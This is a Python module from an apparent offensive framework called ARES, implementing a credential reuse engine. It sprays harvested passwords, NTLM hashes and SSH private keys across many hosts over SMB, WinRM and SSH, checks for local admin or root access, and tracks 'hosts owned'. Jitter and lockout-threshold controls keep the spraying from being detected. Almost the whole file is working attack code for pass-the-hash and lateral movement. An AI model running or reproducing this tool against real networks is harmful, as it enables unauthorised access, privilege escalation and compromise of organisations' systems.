"""
ARES Credential Reuse Engine
Systematically tries discovered credentials against all live services.

Flow:
  CredentialVault.credentials_for_reuse()
    └─► ReuseEngine.spray_all_hosts(credentials, hosts)
          ├─ SMB    (port 445)  → NTLM / cleartext
          ├─ WinRM  (port 5985) → cleartext / NTLM
          ├─ SSH    (port 22)   → cleartext / key
          ├─ LDAP   (port 389)  → cleartext
          └─ RDP    (port 3389) → cleartext (NLA)

OpSec controls:
  - Jitter between each attempt
  - Max failures per host before backoff (lockout protection)
  - Skip if host already owned at domain_admin level
  - Configurable lockout threshold (default 3 attempts per account per host)
"""
from __future__ import annotations

import asyncio
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, TYPE_CHECKING

from ares.core.logger import audit, get_logger
from ares.credential.vault import Credential, CredentialType, CredentialVault

if TYPE_CHECKING:
    from ares.state.target_state import OperatorSession
    from ares.core.opsec.opsec import OpSecProfile

logger = get_logger("ares.credential.reuse")


class ReuseProtocol(str, Enum):
    SMB   = "smb"
    WINRM = "winrm"
    SSH   = "ssh"
    LDAP  = "ldap"
    RDP   = "rdp"
    FTP   = "ftp"


@dataclass
class ReuseAttempt:
    credential_id: str
    username:      str
    domain:        str
    target_host:   str
    protocol:      ReuseProtocol
    success:       bool = False
    error:         str  = ""
    privilege:     str  = ""
    duration_ms:   float = 0.0
    timestamp:     float = field(default_factory=time.time)


@dataclass
class ReuseResult:
    """Aggregated result of a credential reuse campaign."""
    total_attempts:   int = 0
    successes:        int = 0
    failures:         int = 0
    skipped:          int = 0
    lockout_avoids:   int = 0
    successful_auths: list[ReuseAttempt] = field(default_factory=list)
    new_hosts_owned:  list[str]          = field(default_factory=list)
    duration_s:       float = 0.0

    @property
    def success_rate(self) -> float:
        if self.total_attempts == 0:
            return 0.0
        return round(self.successes / self.total_attempts, 3)


# ── Protocol validators — real impacket/paramiko implementations ──────────────

class _ProtocolValidator:
    """Base class for protocol-specific authentication testers."""

    async def test(
        self,
        host: str,
        username: str,
        domain: str,
        secret: str,
        cred_type: CredentialType,
    ) -> tuple[bool, str]:
        """
        Returns (success, privilege_or_error_string).

        Subclasses **must** implement this method for each protocol.
        """
        raise NotImplementedError(  # abstract — each protocol validator must override
            f"{self.__class__.__name__} must implement test()"
        )


class _SMBValidator(_ProtocolValidator):
    """SMB authentication via impacket SMBConnection."""

    async def test(self, host, username, domain, secret, cred_type) -> tuple[bool, str]:
        try:
            from impacket.smbconnection import SMBConnection, SessionError
        except ImportError:
            return False, "impacket not installed"

        lmhash, nthash = "", ""
        password = secret
        if cred_type.value in ("ntlm", "hash") or (
            len(secret) in (32, 65) and all(c in "0123456789abcdefABCDEF:" for c in secret)
        ):
            parts = secret.split(":")
            if len(parts) == 2:
                lmhash, nthash = parts[0], parts[1]
            else:
                nthash = secret
            password = ""

        loop = asyncio.get_running_loop()

        def _connect() -> tuple[bool, str]:
            try:
                conn = SMBConnection(host, host, timeout=10)
                conn.login(username, password, domain, lmhash, nthash)
                if conn.isGuestSession():
                    conn.logoff()
                    return False, "guest_session_only"
                # Check for admin access
                try:
                    conn.connectTree("ADMIN$")
                    conn.logoff()
                    return True, "local_admin"
                except SessionError:
                    conn.logoff()
                    return True, "user"
            except SessionError as exc:
                return False, str(exc)[:150]
            except OSError as exc:
                return False, f"network_error: {exc}"

        try:
            return await loop.run_in_executor(None, _connect)
        except Exception as exc:
            return False, str(exc)[:150]


class _WinRMValidator(_ProtocolValidator):
    """WinRM authentication via pywinrm."""

    async def test(self, host, username, domain, secret, cred_type) -> tuple[bool, str]:
        try:
            import winrm
            from winrm.exceptions import InvalidCredentialsError, WinRMError, WinRMTransportError
        except ImportError:
            return False, "pywinrm not installed — run: pip install pywinrm"

        loop = asyncio.get_running_loop()

        def _connect() -> tuple[bool, str]:
            target_user = f"{domain}\\{username}" if domain else username
            try:
                session = winrm.Session(
                    f"http://{host}:5985/wsman",
                    auth=(target_user, secret),
                    transport="ntlm",
                    read_timeout_sec=10,
                    operation_timeout_sec=10,
                )
                r = session.run_cmd("whoami")
                if r.status_code == 0:
                    out = r.std_out.decode("utf-8", errors="replace").strip().lower()
                    priv = "administrator" if "administrator" in out else "user"
                    return True, priv
                return False, f"exit_code_{r.status_code}"
            except InvalidCredentialsError:
                return False, "invalid_credentials"
            except (WinRMError, WinRMTransportError) as exc:
                return False, str(exc)[:150]
            except OSError as exc:
                return False, f"network_error: {exc}"

        try:
            return await loop.run_in_executor(None, _connect)
        except Exception as exc:
            return False, str(exc)[:150]


class _SSHValidator(_ProtocolValidator):
    """SSH authentication via paramiko."""

    async def test(self, host, username, domain, secret, cred_type) -> tuple[bool, str]:
        try:
            import paramiko, io
        except ImportError:
            return False, "paramiko not installed"

        loop = asyncio.get_running_loop()

        def _connect() -> tuple[bool, str]:
            client = paramiko.SSHClient()
            # AutoAddPolicy is required here because credential spray tests many
            # hosts — supplying a known_hosts file is impractical at this stage.
            # Risk: MITM on untrusted networks can intercept credentials.
            # Operator should run credential reuse only from a trusted pivot or
            # secured operator workstation, not from hotel/public wifi.
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            import logging as _log
            _log.getLogger("ares.credential.reuse").warning(
                "ssh_host_key_unverified host=%s — MITM risk on untrusted networks; "
                "run credential reuse only from a secured operator workstation.",
                host,
            )
            try:
                connect_kwargs: dict = {
                    "hostname": host,
                    "username": username,
                    "timeout": 10,
                    "banner_timeout": 8,
                    "allow_agent": False,
                    "look_for_keys": False,
                }
                if cred_type.value == "ssh_key" or secret.strip().startswith("-----BEGIN"):
                    try:
                        pkey = paramiko.RSAKey.from_private_key(io.StringIO(secret))
                    except paramiko.ssh_exception.SSHException:
                        pkey = paramiko.Ed25519Key.from_private_key(io.StringIO(secret))
                    connect_kwargs["pkey"] = pkey
                else:
                    connect_kwargs["password"] = secret

                client.connect(**connect_kwargs)
                _, stdout_fh, _ = client.exec_command("id", timeout=10)
                out = stdout_fh.read().decode("utf-8", errors="replace").strip()
                client.close()
                privilege = "root" if "uid=0" in out else "user"
                return True, privilege
            except paramiko.AuthenticationException:
                return False, "authentication_failed"
            except (paramiko.SSHException, OSError) as exc:
                return False, str(exc)[:150]
            finally:
                try:
                    client.close()
                except (OSError, AttributeError):
                    pass

        try:
            return await loop.run_in_executor(None, _connect)
        except Exception as exc:
            return False, str(exc)[:150]


_VALIDATORS: dict[ReuseProtocol, _ProtocolValidator] = {
    ReuseProtocol.SMB:   _SMBValidator(),
    ReuseProtocol.WINRM: _WinRMValidator(),
    ReuseProtocol.SSH:   _SSHValidator(),
}

# Port → default protocol for service discovery integration
PORT_TO_PROTOCOL: dict[int, ReuseProtocol] = {
    22:   ReuseProtocol.SSH,
    139:  ReuseProtocol.SMB,
    445:  ReuseProtocol.SMB,
    3389: ReuseProtocol.RDP,
    5985: ReuseProtocol.WINRM,
    5986: ReuseProtocol.WINRM,
}


# ── Reuse Engine ───────────────────────────────────────────────────────────────

class ReuseEngine:
    """
    Credential reuse automation engine.

    Respects lockout thresholds to avoid account lockout in production environments.
    Integrates with OperatorSession for state tracking.
    """

    def __init__(
        self,
        vault:            CredentialVault,
        opsec:            "OpSecProfile | None" = None,
        lockout_threshold: int   = 3,     # max attempts per account per host
        max_parallel:      int   = 5,     # concurrent reuse attempts
        jitter_base_s:     float = 2.0,   # base sleep between attempts
    ) -> None:
        self.vault             = vault
        self.opsec             = opsec
        self.lockout_threshold = lockout_threshold
        self.max_parallel      = max_parallel
        self.jitter_base_s     = jitter_base_s
        self._attempt_counts:  dict[str, int] = {}  # "host:username" → attempt count

    async def spray_all_hosts(
        self,
        campaign_id: str,
        hosts:       list[str],
        protocols:   list[ReuseProtocol] | None = None,
        credential_ids: list[str] | None = None,
    ) -> ReuseResult:
        """
        Try top credentials from vault against all specified hosts.

        Args:
            campaign_id:    Campaign to pull credentials from
            hosts:          List of IP addresses / hostnames to target
            protocols:      Protocols to try (default: SMB, WinRM, SSH)
            credential_ids: Specific credential IDs (default: top reusable creds)
        """
        result = ReuseResult()
        t0 = time.monotonic()
        protocols = protocols or [ReuseProtocol.SMB, ReuseProtocol.WINRM, ReuseProtocol.SSH]

        if credential_ids:
            creds = [c for c in (self.vault.get(cid) for cid in credential_ids) if c]
        else:
            creds = self.vault.credentials_for_reuse(campaign_id=campaign_id)

        if not creds:
            logger.warning("reuse_no_credentials_available", campaign=campaign_id)
            return result

        logger.info(
            "reuse_spray_start",
            credentials=len(creds),
            hosts=len(hosts),
            protocols=[p.value for p in protocols],
        )
        audit("credential_reuse_start", actor="engine",
              cred_count=len(creds), host_count=len(hosts), campaign=campaign_id)

        sem = asyncio.Semaphore(self.max_parallel)
        tasks: list[Any] = []

        for host in hosts:
            for cred in creds:
                for proto in protocols:
                    if self._should_skip(host, cred):
                        result.skipped += 1
                        continue
                    tasks.append(
                        self._attempt_with_sem(sem, result, cred, host, proto)
                    )

        await asyncio.gather(*tasks)

        result.duration_s = round(time.monotonic() - t0, 2)
        logger.info(
            "reuse_spray_complete",
            total=result.total_attempts,
            successes=result.successes,
            success_rate=result.success_rate,
            duration_s=result.duration_s,
        )
        if result.successes:
            audit("credential_reuse_success", actor="engine",
                  successes=result.successes, hosts_owned=result.new_hosts_owned)
        return result

    async def try_single(
        self,
        cred: Credential,
        host: str,
        protocol: ReuseProtocol,
    ) -> ReuseAttempt:
        """Try one credential against one host on one protocol."""
        secret = self.vault.reveal(cred.id)
        validator = _VALIDATORS.get(protocol)
        if not validator:
            return ReuseAttempt(
                credential_id=cred.id, username=cred.username,
                domain=cred.domain, target_host=host, protocol=protocol,
                success=False, error="no_validator",
            )

        t0 = time.monotonic()
        attempt = ReuseAttempt(
            credential_id=cred.id, username=cred.username,
            domain=cred.domain, target_host=host, protocol=protocol,
        )

        if self.opsec:
            await self.opsec.before_request(action="default")

        try:
            success, info = await validator.test(
                host, cred.username, cred.domain, secret, cred.cred_type,
            )
            attempt.success   = success
            attempt.privilege = info if success else ""
            attempt.error     = "" if success else info
        except Exception as exc:
            attempt.success = False
            attempt.error   = str(exc)[:200]

        attempt.duration_ms = round((time.monotonic() - t0) * 1000, 2)

        if attempt.success:
            self.vault.mark_validated(cred.id, host)
            logger.info(
                "credential_reuse_success",
                fqdn=cred.fqdn, host=host, protocol=protocol.value,
                privilege=attempt.privilege,
            )
        else:
            self._record_attempt(host, cred.username)

        return attempt

    async def _attempt_with_sem(
        self,
        sem:    asyncio.Semaphore,
        result: ReuseResult,
        cred:   Credential,
        host:   str,
        proto:  ReuseProtocol,
    ) -> None:
        async with sem:
            attempt = await self.try_single(cred, host, proto)
            result.total_attempts += 1
            if attempt.success:
                result.successes += 1
                result.successful_auths.append(attempt)
                if host not in result.new_hosts_owned:
                    result.new_hosts_owned.append(host)
            else:
                result.failures += 1

    def _should_skip(self, host: str, cred: Credential) -> bool:
        """Lockout protection — skip if attempt count exceeds threshold."""
        key = f"{host}:{cred.username.lower()}"
        if self._attempt_counts.get(key, 0) >= self.lockout_threshold:
            logger.debug("reuse_skip_lockout_protection", host=host, username=cred.username)
            return True
        return False

    def _record_attempt(self, host: str, username: str) -> None:
        key = f"{host}:{username.lower()}"
        self._attempt_counts[key] = self._attempt_counts.get(key, 0) + 1



# ── Public aliases (backward compatibility) ───────────────────────────────

#: Alias for ReuseEngine — canonical export name used by tests and external tooling
CredentialReuser = ReuseEngine

#: Alias for ReuseResult — descriptive name for import
ReuseResult = ReuseResult  # noqa: PLW0127 (self-assignment for explicit export)
